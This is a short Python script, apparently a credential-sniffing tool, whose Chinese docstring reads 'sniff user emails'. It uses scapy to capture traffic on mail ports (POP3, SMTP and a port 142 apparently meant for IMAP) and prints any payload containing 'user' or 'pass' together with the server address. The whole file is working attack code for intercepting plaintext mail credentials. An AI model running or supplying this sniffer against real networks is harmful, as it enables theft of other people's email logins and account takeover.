# coding:utf-8

'''
@author = super_fazai
@File    : sniff_email.py
@connect : superonesfazai@gmail.com
'''

"""
嗅探用户邮件
"""

from scapy.all import (
    TCP,
    IP,
    sniff,
)

def pkt_callback(pkt):
    if pkt[TCP].payload:
        mail_pkt = str(pkt[TCP].payload)
        if 'user' in mail_pkt.lower() or 'pass' in mail_pkt.lower():
            print('[*] server: {}'.format(pkt[IP].dst))
            print('[*] {}'.format(pkt[TCP].payload))

while True:
    _filter = 'tcp port 110 or tcp port 25 or tcp port 142'
    sniff(filter=_filter, prn=pkt_callback, store=0)


